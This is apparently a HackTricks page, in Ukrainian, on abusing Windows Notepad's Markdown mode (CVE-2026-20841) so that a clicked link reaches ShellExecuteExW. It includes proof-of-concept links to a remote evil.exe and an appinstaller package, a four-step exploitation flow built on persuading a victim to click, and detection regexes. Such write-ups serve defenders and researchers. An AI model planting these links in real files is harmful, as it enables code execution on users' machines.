# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Сучасні Windows-застосунки, які відображають Markdown/HTML, часто перетворюють надані користувачем посилання на клікабельні елементи та передають їх до `ShellExecuteExW`. Без суворого allowlist схем можна активувати будь-який зареєстрований protocol handler (наприклад, `file:`, `ms-appinstaller:`), що може призвести до виконання коду в контексті поточного користувача.<sup>[[1]](#references)</sup>

## Поверхня ShellExecuteExW у режимі Markdown Windows Notepad
- Notepad вмикає режим Markdown **лише для розширень `.md`** через порівняння фіксованих рядків у `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Підтримувані Markdown-посилання:
- Standard: `[text](target)`
- Autolink: `<target>` (відображається як `[target](target)`), тому обидва синтаксиси важливі для payloads і виявлення.
- Кліки на посилання обробляються в `sub_140170F60()`, яка виконує слабку фільтрацію, а потім викликає `ShellExecuteExW`.
- `ShellExecuteExW` передає обробку **будь-якому налаштованому protocol handler**, а не лише HTTP(S).<sup>[[1]](#references)</sup>

### Міркування щодо Payload
- Будь-які послідовності `\\` у посиланні **нормалізуються до `\`** перед викликом `ShellExecuteExW`, що впливає на створення UNC/path і виявлення.
- Файли `.md` **не пов’язані з Notepad за замовчуванням**; жертва все одно повинна відкрити файл у Notepad і натиснути посилання, але після відображення воно стає клікабельним.
- Небезпечні приклади схем:<sup>[[1]](#references)</sup>
- `file://` для запуску локального/UNC payload.
- `ms-appinstaller://` для запуску сценаріїв App Installer. Інші локально зареєстровані схеми також можуть бути зловживані.

### Мінімальний PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Потік експлуатації
1. Створіть **`.md` file**, щоб Notepad відобразив його як Markdown.
2. Вбудуйте link, використовуючи небезпечну URI scheme (`file:`, `ms-appinstaller:` або будь-який встановлений handler).
3. Доставте file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB або подібним протоколом) і переконайте користувача відкрити його в Notepad.
4. Після натискання **normalized link** передається до `ShellExecuteExW`, після чого відповідний protocol handler виконує referenced content у контексті користувача.<sup>[[1]](#references)[[2]](#references)</sup>

## Ідеї для виявлення
- Відстежуйте передавання `.md` files через порти/протоколи, які зазвичай використовуються для доставки документів: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Аналізуйте Markdown links (standard і autolink) і шукайте **case-insensitive** `file:` або `ms-appinstaller:`.
- Regexes, рекомендовані vendor, для виявлення доступу до remote resources:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Повідомляється, що поведінка після patch **дозволяє локальні файли та HTTP(S)**; усе інше, що досягає `ShellExecuteExW`, є підозрілим. За потреби розширюйте detections на інші встановлені protocol handlers, оскільки attack surface залежить від системи.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Довільне виконання коду у Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC для CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
